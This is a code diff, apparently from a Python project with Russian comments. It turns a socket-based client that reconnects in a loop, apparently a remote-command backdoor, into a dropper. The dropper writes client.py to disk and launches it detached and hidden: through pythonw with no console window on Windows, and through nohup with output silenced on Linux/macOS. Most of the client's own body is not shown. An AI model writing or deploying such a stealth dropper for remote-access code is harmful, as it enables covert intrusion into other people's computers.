@@ -1,3 +1,9 @@
+import os
+import sys
+import subprocess
+import time
+
+CLIENT_CODE = '''\
 import socket
 import subprocess
 import os
@@ -73,6 +79,47 @@ def main():
             s.close()
         # при разрыве ждем и переподключаемся заново
         time.sleep(5)
+
+if __name__ == "__main__":
+    main()
+'''
+
+def create_client_file():
+    filename = "client.py"
+    if os.path.exists(filename):
+        print(f"{filename} уже существует, пропускаем создание.")
+        return
+    with open(filename, "w", encoding="utf-8") as f:
+        f.write(CLIENT_CODE)
+    print(f"{filename} успешно создан.")
+
+def run_client_in_background():
+    # Запускаем client.py в фоне, без привязки к терминалу
+    # Кроссплатформенно пока делаем простой запуск subprocess и завершаемся
+    # Для Linux/macOS: nohup python3 client.py >/dev/null 2>&1 &
+    # Для Windows: pythonw.exe client.py
+
+    # Определяем команду запуска в зависимости от платформы
+    if os.name == 'nt':
+        # Windows
+        pythonw_path = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
+        if not os.path.exists(pythonw_path):
+            # fallback на python.exe если pythonw нет
+            pythonw_path = sys.executable
+        # Запуск через CREATE_NO_WINDOW чтобы не показывать консоль
+        DETACHED_PROCESS = 0x00000008
+        subprocess.Popen([pythonw_path, "client.py"], creationflags=DETACHED_PROCESS)
+    else:
+        # Linux/macOS
+        # Используем nohup и запуск в фоне
+        subprocess.Popen(["nohup", sys.executable, "client.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setpgrp)
+
+def main():
+    create_client_file()
+    run_client_in_background()
+    print("Клиент запущен в фоне.")
+    # Если хочешь, можно завершать данный скрипт сразу:
+    # sys.exit()
 
 if __name__ == "__main__":
     main()
